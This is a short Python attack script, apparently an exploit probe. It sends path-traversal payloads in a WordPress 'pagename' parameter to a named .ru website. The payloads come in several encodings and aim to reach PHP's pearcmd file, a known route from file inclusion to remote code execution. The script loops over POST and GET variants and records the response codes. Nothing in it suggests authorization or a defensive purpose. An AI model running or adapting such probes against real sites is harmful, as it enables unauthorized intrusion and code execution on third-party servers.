from core import vuln

h = "mirk154.ru"
base = "https://" + h
CT = "application/x-www-form-urlencoded"
one = "page-templates/../../../../usr/local/lib/php/pearcmd"
enc = vuln._denc(one)
pid = 4473

tests = [
  ("query, двойное", base + "/?page_id=%d&pagename=%s" % (pid, enc), None),
  ("query, одинарное", base + "/?page_id=%d&pagename=%s" % (pid, one.replace("/", "%2F").replace(".", "%2E")), None),
  ("query без page_id", base + "/?pagename=%s" % enc, None),
  ("query pagename+perm", base + "/?pagename=%s&page_id=%d" % (enc, pid), None),
  ("GET query", base + "/?page_id=%d&pagename=%s" % (pid, enc), "GET"),
]
for name, url, m in tests:
    try:
        r = vuln._req(m or "POST", url, body=b"" if (m or "POST") == "POST" else None, ctype=CT)
    except Exception as e:
        print(name, "EXC", type(e).__name__); continue
    t = r.text or ""
    print("%-22s %s len=%d" % (name, r.status_code, len(t)))